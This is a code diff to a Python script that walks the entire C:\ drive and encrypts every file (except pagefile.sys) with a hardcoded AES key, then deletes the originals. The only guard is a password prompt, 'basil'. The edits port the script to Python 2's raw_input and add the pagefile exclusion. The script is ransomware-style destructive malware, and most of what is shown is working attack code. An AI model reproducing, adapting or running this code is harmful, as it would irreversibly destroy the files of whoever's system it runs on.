@@ -1,7 +1,8 @@
 import time
 import random
 import os, random, struct
-from Crypto.Cipher import AES
+from Crypto.Cipher import AES # @UnresolvedImport
+
 
 
 
@@ -50,21 +51,22 @@ def encrypt_file(key, in_filename, out_filename, chunksize):
 
 
 
-password = input("Oh god dont do this accidentally, whats the password: ")
+password = raw_input("Oh god dont do this accidentally, whats the password: ")  # @UndefinedVariable
 if password != "basil":
     exit()
 rootdir = 'C:\\'
 
 for subdir, dirs, files in os.walk(rootdir):
     for file in files:
+        if file != "pagefile.sys":
+            filename = os.path.join(subdir, file)
         
-        filename = os.path.join(subdir, file)
-        
-        encrypt_file("0c92c4e1a35551ed366ca52bf12b6037", filename, None, 64*1024)
-        try: 
-            os.remove(filename)
-        except OSError:
-            pass     
+            encrypt_file("0c92c4e1a35551ed366ca52bf12b6037", filename, None, 64*1024)
+            try: 
+                os.remove(filename)
+            except OSError:
+                pass
+             
         
 
 
